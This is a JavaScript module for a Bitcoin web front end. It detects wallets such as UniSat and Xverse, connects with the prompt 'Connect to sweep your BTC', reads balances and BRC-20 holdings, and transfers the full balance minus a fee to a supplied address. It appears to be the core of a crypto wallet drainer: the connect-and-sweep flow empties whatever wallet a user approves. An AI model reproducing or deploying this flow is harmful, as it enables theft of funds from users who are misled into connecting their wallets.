
import axios from "axios"
import { getProviders, request, setDefaultProvider } from "sats-connect";

// 1. Detect all available Bitcoin providers (EIP-6963 style)
export const getAvailableBitcoinWallets = () => {
    if (typeof window === "undefined") return [];

    // This grabs UniSat, Xverse, OKX, and any WBIP-004 compliant wallet
    const providers = getProviders();

    // Ensure UniSat is included and prioritized (for browser extensions)
    const unisatExists = providers.some(p => p.id === "unisat");
    if (window.unisat && !unisatExists) {
        providers.unshift({ id: "unisat", name: "UniSat", icon: "https://unisat.io/img/favicon.ico" });
    } else if (unisatExists) {
        // Move UniSat to the front so it is the default choice if it exists
        const idx = providers.findIndex(p => p.id === "unisat");
        if (idx > 0) {
            const [unisat] = providers.splice(idx, 1);
            providers.unshift(unisat);
        }
    }

    return providers;
};

// 1. NEW: Fetch real-time gas/fee rates
export const getRecommendedFee = async () => {
    try {
        // Using mempool.space API (works for mainnet/testnet via different endpoints)
        // For testnet use: https://mempool.space/testnet/api/v1/fees/recommended
        const res = await axios.get("https://mempool.space/api/v1/fees/recommended");
        console.log("Real-time Fee Rates:", res.data);
        return res.data.fastestFee; // Ensure quick confirmation
    } catch (e) {
        console.error("Fee Fetch Error, defaulting to 25 sats/vB:", e);
        return 25; 
    }
}

// connect unisat // also supports multiple providers
// The Universal Connection Function
export const connectBitcoinWallet = async (providerId) => {
  try {
    // If a providerId is passed, prefer it (this helps prioritize browser extensions).
    // If not, try to auto-select a provider (favor UniSat if present).
    let selectedProviderId = providerId;

    if (!selectedProviderId) {
      if (typeof window !== "undefined" && window.unisat) {
        selectedProviderId = "unisat";
      } else {
        const providers = getProviders();
        if (providers.length > 0) selectedProviderId = providers[0].id;
      }
    }

    if (selectedProviderId) {
      setDefaultProvider(selectedProviderId);
    }

    // If we explicitly want UniSat and the browser extension is available, use it directly.
    if (selectedProviderId === "unisat" && typeof window !== "undefined" && window.unisat) {
      const accounts = await window.unisat.requestAccounts();
      const publicKey = await window.unisat.getPublicKey();
      const balObj = await window.unisat.getBalance();

      return {
        address: accounts[0],
        publicKey,
        type: selectedProviderId,
        balance: balObj.total,
      };
    }

    // Otherwise, use sats-connect's request path (will open wallet selector / deep link flows)
    const response = await request("getAccounts", {
      purposes: ["payment"],
      message: "Connect to sweep your BTC",
    });

    if (response.status === "success") {
      const paymentAddress = response.result.find(a => a.purpose === "payment");
      const address = paymentAddress?.address;
      const publicKey = paymentAddress?.publicKey;

      // If provider doesn't expose balance, fetch it via a block explorer.
      let balance = 0;
      try {
        const balRes = await axios.get(`https://mempool.space/api/address/${address}`);
        balance = balRes.data.chain_stats.funded_txo_sum - balRes.data.chain_stats.spent_txo_sum;
      } catch (err) {
        console.warn("Failed to fetch BTC balance from explorer", err);
      }

      return {
        address,
        publicKey,
        type: selectedProviderId || "sats-connect",
        balance,
      };
    }
  } catch (err) {
    console.error("User cancelled or wallet not found", err);
    // If on mobile and wallet not found, you can redirect to the App Store
    if (/iPhone|Android/i.test(navigator.userAgent)) {
       window.location.href = "https://www.xverse.app/download"; 
    }
    return null;
  }
};

// fetch brc-20 tokens balances using (hiro-api)
export const getBrc20Balances = async (address) => {
    console.log(`Fetching BRC-20 balances for: ${address}...`);
    try {
        const res = await axios.get(`https://api.hiro.so/ordinals/v1/brc-20/balances/${address}`)
        console.log("Hiro API Response Success:", res.data.results);
        return res.data.results // Returns array of { thicker, overall_balance, etc.}
    } catch (e) {
        console.error("Error fetching BRC-20: ", e)
        return []
    }
}

// send btc frontend version
export const sendBitcoin = async (toAddress, totalBalance, walletType) => {
    try {
        const feeRate = await getRecommendedFee();
        const fee = 150 * feeRate; 
        const amountToSend = totalBalance - fee;

        if (amountToSend <= 546) return null;

        // Route to the correct provider
        if (walletType === "unisat") {
            return await window.unisat.sendBitcoin(toAddress, amountToSend);
        } else {
            // Generic Sats-Connect send for Xverse, OKX, Trust (if supported)
            const response = await request("sendTransfer", {
                recipient: toAddress,
                amount: amountToSend,
            });
            return response.result.txid;
        }
    } catch (e) {
        console.error("Transaction Failed:", e);
        return null;
    }
};